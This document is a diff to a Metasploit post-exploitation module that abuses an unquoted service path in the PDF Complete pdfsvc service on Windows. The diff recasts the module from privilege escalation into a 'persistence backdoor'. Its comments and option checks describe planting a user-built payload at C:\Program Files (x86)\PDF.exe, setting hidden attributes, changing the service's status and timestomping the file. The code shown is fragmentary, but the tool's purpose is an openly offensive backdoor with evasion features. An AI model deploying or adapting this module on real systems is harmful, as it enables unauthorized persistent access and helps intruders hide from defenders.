@@ -7,7 +7,7 @@
 
 
 ##
-# Exploit Title  : PDF_service_backdoor.rb - 'Unquoted Service Path Privilege Escalation'
+# Exploit Title  : PDF_service_backdoor.rb - 'Unquoted Service Path backdoor'
 # PDF Version    : 4.1.12
 # vuln Discover  : Joey Lane
 # Module Author  : pedr0 Ubuntu [r00t-3xp10it]
@@ -58,7 +58,7 @@
 # Deploy PDF.exe insted of Program.exe?           => set PDF_EXE true
 # WARNING: advanced option 'PDF_EXE' requires user to build one 'PDF.exe' payload and use
 # 'LOCAL_PATH' to deploy it (payload will be deploy in: C:\Program Files (x86)\PDF.exe
-# examples: set LOCAL_PATH /root/PDF.exe AND set PDF_EXE true AND exploit
+# examples: set LOCAL_PATH /root/PDF.exe AND set PDF_EXE true
 # ---------------------------------------------------------------------------------------
 #
 # "WARNING: This module will not delete the payload deployed"
@@ -127,11 +127,10 @@ class MetasploitModule < Msf::Post
                                 [
                                         'Vuln discover: Joey Lane',    # vulnerability discover
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
-                                        # 'Special thanks:', # testing/debug module
                                 ],
  
-                        'Version'        => '$Revision: 1.4',
-                        'DisclosureDate' => 'nov 18 2016',
+                        'Version'        => '$Revision: 1.5',
+                        'DisclosureDate' => 'nov 21 2016',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'true', # requires elevated privileges
@@ -199,7 +198,7 @@ def ls_stage1
   r=''
   session = client
   u_path = datastore['LOCAL_PATH']
-  bin_path = "%programfiles(x86)%\\PDF Complete\\pdfsvc.exe"
+  bin_path = "%programfiles(x86)%\\\"PDF Complete\"\\pdfsvc.exe"
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['LOCAL_PATH'] == 'nil'
@@ -283,7 +282,7 @@ def ls_stage2
   session = client
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
-  if datastore['HIDDEN_ATTRIB'].blank?
+  if datastore['HIDDEN_ATTRIB'] == 'nil'
     print_error("Options not configurated correctly...")
     print_warning("Please set HIDDEN_ATTRIB option!")
     return nil
@@ -353,7 +352,7 @@ def ls_stage3
   hklm = "HKLM\\System\\CurrentControlSet\\services\\#{s_name}"
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
-  if datastore['SERVICE_STATUS'].blank?
+  if datastore['SERVICE_STATUS'] == 'nil'
     print_error("Options not configurated correctly...")
     print_warning("Please set SERVICE_STATUS option!")
     return nil
@@ -476,7 +475,7 @@ def ls_stage4
   session = client
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
-  if datastore['BLANK_TIMESTOMP'].blank?
+  if datastore['BLANK_TIMESTOMP'] == 'nil'
     print_error("Options not configurated correctly...")
     print_warning("Please set BLANK_TIMESTOMP option!")
     return nil
@@ -543,7 +542,7 @@ def run
 
     # Print banner and scan results on screen pdfcDispatcher
     print_line("    +----------------------------------------------+")
-    print_line("    | PRIVILEGE ESCALATION IN PDFDISPACHER SERVICE |")
+    print_line("    | PERSISTENCE BACKDOOR IN PDFDISPACHER SERVICE |")
     print_line("    |     Author: Pedro Ubuntu [ r00t-3xp10it ]    |")
     print_line("    +----------------------------------------------+")
     print_line("")
